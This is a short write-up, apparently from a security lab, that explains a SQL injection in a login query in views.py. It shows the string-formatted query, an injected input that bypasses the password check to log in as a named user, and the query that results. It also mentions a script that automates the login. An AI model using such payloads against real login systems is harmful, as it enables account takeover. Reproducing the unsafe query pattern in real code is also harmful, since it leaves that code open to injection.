SQL Injection:
Analyzing the source code, I found the login sql query in file views.py, line
279. 

SELECT * FROM community_member WHERE email = '%s' AND password = '%s';

And after that, I wrote the following sentence to login as Hanni Ball:

x' OR first_name = 'Hanni';--

So, the resulting query would be

SELECT * FROM community_member WHERE email = 'x' OR first_name = 'Hanni'; --' AND password = '%s';

And it will, at least, return Hanni Ball credentials and set the session as logged in.

The script uses the same sentence to log in as Hanni Ball and returns a message
saying whether it succeeded or not.
